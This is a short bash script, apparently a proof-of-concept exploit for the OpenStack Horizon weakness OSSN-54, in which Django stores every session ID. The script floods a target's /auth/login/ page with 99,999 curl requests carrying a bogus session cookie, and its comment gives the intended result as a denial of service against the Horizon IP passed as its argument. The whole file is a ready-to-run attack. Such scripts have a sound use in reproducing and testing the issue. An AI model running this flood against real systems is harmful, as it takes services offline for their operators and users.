#!/bin/bash

# input: Horizon IP address
# Result: Horizon DOS
# Ref: OSSN-54 - All Django session IDs stored, resulting in Horizon DOS

for i in {1..99999}
do
  curl -b "sessionid=aaaaa;" http://$1/auth/login/ &> /dev/null
done

# Tags: Horizon, Django, Essex, Folsom, Grizzly, Havana, Icehouse, Juno

